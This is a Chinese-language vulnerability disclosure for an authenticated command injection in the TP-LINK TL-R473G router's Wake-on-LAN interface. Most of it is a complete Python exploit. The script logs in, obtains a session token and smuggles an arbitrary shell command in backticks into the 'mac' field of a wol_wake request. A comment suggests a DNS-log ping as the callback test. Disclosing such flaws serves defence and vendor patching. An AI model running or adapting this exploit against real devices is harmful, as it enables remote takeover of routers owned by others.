# TP-LINK TL-R473G 存在命令注入漏洞

**CVE ID**:  

**CNVD ID**: 

**漏洞厂商**:  TP-LINK

**厂商官网**: https://www.tp-link.com.cn/、https://www.tp-link.com/

**影响产品**: TL-R473G

**影响产品版本**: 2.0.1 Build 220529 Rel.65574n(最新版)

**固件链接**: 非最新版固件 https://smb.tp-link.com.cn/service/detail_download_8644.html

**报送者**: [SkYe231](mailto:skye231@foxmail.com)@Hillstone

## 漏洞描述

TP-LINK TL-R473G由于过滤规则不完善，造成远程命令执行漏洞，攻击者可以通过精心构造的数据包绕过限制，实现远程命令执行。

## 漏洞详情

漏洞产生在路由器后台的网络唤醒功能。在登录后台后，修改唤醒流量包即可完成后台 RCE 。下面是代码分析。

![](img/Pasted%20image%2020220725160829.png)

处理 wol 唤醒的接口 wol_wake 从 json 提取 usrif ，将 usrif 传入 s() 简单验证是否为空值，然后拼接系统命令，进行网卡存在性校验。进行系统调用没有过滤特殊字符串导致 RCE。

![](img/Pasted%20image%2020220725160444.png)

![](img/Pasted%20image%2020220725160406.png)

## EXP

```python
# encoding:utf-8
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json,sys

TIMEOUT_MAX = 60
HOST = sys.argv[1]
USERNAME = sys.argv[2]
PASSWORD = sys.argv[3]
COMMAND = sys.argv[4]#"ping a5urz4.dnslog.cn"

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def get_stok(host,username,password):
    headers = {
        "Content-Type":"application/json; charset=UTF-8"
    }
    data = {"method":"do","login":{"username":username,"password":password}}
    url = host
    response = requests.post(url=url,headers=headers,data=json.dumps(data),verify=False,timeout=TIMEOUT_MAX)
    stok = json.loads(response.text)["stok"]
    print("[+]Get stok:",stok)
    return stok

def rce(host,stok):
    url = host+"/stok="+stok+"/ds"
    headers = {
        "Content-Type":"application/json; charset=UTF-8"
    }
    data = {"method":"do","wol":{"wol_wake":{"mac":"DC-DC-DC-DC-`{}`-DC".format(COMMAND),"usrif":"LAN"}}}
    response = requests.post(url=url,headers=headers,data=json.dumps(data))
    if json.loads(response.text)["error_code"] == 0 :
        print("[+]Success")
    else:
        print("[-]Error")

def exp(host,username,password):
    host = host.strip()
    if host[:4] != "http":
        host = "http://" + host
    stok = get_stok(host,username,password)
    if stok != -1:
        rce(host,stok)

if __name__ == "__main__":
    exp(HOST,USERNAME,PASSWORD)
```

